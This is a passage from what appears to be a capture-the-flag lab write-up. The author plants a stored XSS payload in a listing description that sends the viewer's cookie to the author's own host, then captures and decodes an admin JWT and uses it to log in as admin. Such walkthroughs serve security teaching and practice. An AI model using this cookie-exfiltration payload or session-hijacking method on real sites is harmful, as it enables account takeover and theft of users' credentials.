
I made a listing with description :  `<script>fetch("http://10.14.12.121:8000/?u=ttest&data=" + btoa(document.cookie));</script>`

Then i reported this so a admin would look at it and send me his/her token cookie to login as an admin.


```
10.10.91.7 - - [24/Jul/2022 12:59:47] "GET /?data=dG9rZW49ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5U1dRaU9qSXNJblZ6WlhKdVlXMWxJam9pYldsamFHRmxiQ0lzSW1Ga2JXbHVJanAwY25WbExDSnBZWFFpT2pFMk5UZzJPREU1TmpOOS5rMEdfdTc1bDR4Wm9xakhCYTZtVFVfY3JWb1hfWkhQSDlqVGV5WC11OWdV HTTP/1.1" 200 -

```

If we base64 decode this and base64 decode the token itself, we see we get a `michael` login

```
{"alg":"HS256","typ":"JWT"}{"userId":2,"username":"michael","admin":true,"iat":1658414426}nЋ~о.)ыЇ„w:;Љ‚/•sр9¤x{–—0TК
```

We login to their backend and find the first THM Flag.
2


Lets use this token on the website and see what we can do

We get some sort of admin panel, nothing special.

as this is kind of a dead end, lets dirbust this webpage
